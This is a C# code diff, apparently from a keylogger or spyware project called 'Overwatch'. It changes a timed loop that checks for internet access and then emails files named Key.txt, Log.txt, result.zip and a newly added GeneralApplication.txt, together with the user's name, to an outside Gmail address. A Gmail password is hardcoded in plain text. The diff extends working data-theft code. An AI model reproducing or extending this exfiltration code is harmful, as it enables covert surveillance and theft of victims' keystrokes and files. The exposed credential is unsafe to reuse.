@@ -16,7 +16,7 @@ namespace Overwatch
             {
                 while (true)
                 {
-                    System.Threading.Thread.Sleep(60000);
+                    System.Threading.Thread.Sleep(65000);
                     
                     if (ConnectivityChecker.CheckInternet() == true)
                     {
@@ -26,14 +26,14 @@ namespace Overwatch
                         {
                             mail.From = new MailAddress("isthechastener@gmail.com");
                             mail.To.Add("satiriorn@gmail.com");
-                            mail.Subject = "Hello World";
-                            mail.Body = "<h1>Hello</h1>";
+                            mail.Subject = "INFORMATION";
+                            mail.Body = String.Format("<h1>{0}</h1>", cReceiveInformation.UsersName);
                             mail.IsBodyHtml = true;
                             cReceiveInformation.CompressionFile();
                             mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                             mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
-                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));
-
+                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\result.zip"));
+                            mail.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\GeneralApplication.txt"));
                             using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                             {
                                 smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
